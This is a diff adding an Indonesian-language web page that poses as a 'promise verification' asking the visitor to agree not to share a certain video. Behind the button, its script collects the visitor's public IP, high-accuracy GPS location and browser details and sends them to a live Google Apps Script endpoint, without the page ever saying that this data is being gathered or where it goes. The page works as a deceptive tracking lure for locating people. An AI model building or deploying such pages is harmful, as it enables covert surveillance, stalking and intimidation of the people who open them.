@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verifikasi Janji</title>
+<style>
+body{font-family:Arial,sans-serif;background:#111;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.card{width:min(92vw,460px);background:#1d1d1d;padding:28px;border-radius:18px;box-sizing:border-box;text-align:center}
+p{color:#c7c7c7;line-height:1.55}
+button{width:100%;padding:13px;margin-top:12px;border:0;border-radius:10px;font-weight:700;cursor:pointer}
+#agree{background:#fff;color:#111}
+#status{margin-top:16px;color:#9ee6a8;line-height:1.5}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>🔐 Verifikasi janji</h2>
+  <p>
+    Dengan menekan tombol di bawah, Anda menyetujui untuk tidak menyebarkan video tersebut.
+  </p>
+  <button id="agree">Saya Setuju & Lanjut</button>
+  <div id="status"></div>
+</div>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwlIcN7siv2FGbCxV1Xgg0ungmUKJVBOxQ4xeIqDnZIw6MgTE45OVmotrmhVwAPSz9h/exec";
+const IP_API = "https://api.ipify.org?format=json";
+
+const btn = document.getElementById("agree");
+const status = document.getElementById("status");
+
+function sendToSheet(ip, lat, lon, accuracy) {
+  const ua = encodeURIComponent(navigator.userAgent);
+  const params = new URLSearchParams({
+    ip: ip || "",
+    lat: lat ?? "",
+    lon: lon ?? "",
+    accuracy: accuracy ?? "",
+    ua: navigator.userAgent || ""
+  });
+
+  window.location.href = `${WEB_APP_URL}?${params.toString()}`;
+}
+
+async function getIP() {
+  const r = await fetch(IP_API);
+  if (!r.ok) throw new Error("IP gagal diambil");
+  const data = await r.json();
+  return data.ip;
+}
+
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({lat:"", lon:"", accuracy:""});
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      }),
+      () => resolve({lat:"", lon:"", accuracy:""}),
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
+btn.onclick = async () => {
+  if (WEB_APP_URL.includes("PASTE_WEB_APP_URL")) {
+    status.textContent = "Admin belum mengatur URL Google Apps Script.";
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = "Memproses...";
+  status.textContent = "Mengambil IP dan meminta izin lokasi...";
+
+  try {
+    const [ip, loc] = await Promise.all([
+      getIP(),
+      getLocation()
+    ]);
+
+    status.textContent = loc.lat
+      ? "Lokasi diberikan. Menyimpan data..."
+      : "Izin lokasi tidak diberikan. Menyimpan IP saja...";
+
+    sendToSheet(ip, loc.lat, loc.lon, loc.accuracy);
+  } catch (e) {
+    status.textContent = "Terjadi kesalahan. Silakan coba lagi.";
+    btn.disabled = false;
+    btn.textContent = "Saya Setuju & Lanjut";
+  }
+};
+</script>
+</body>
+</html>
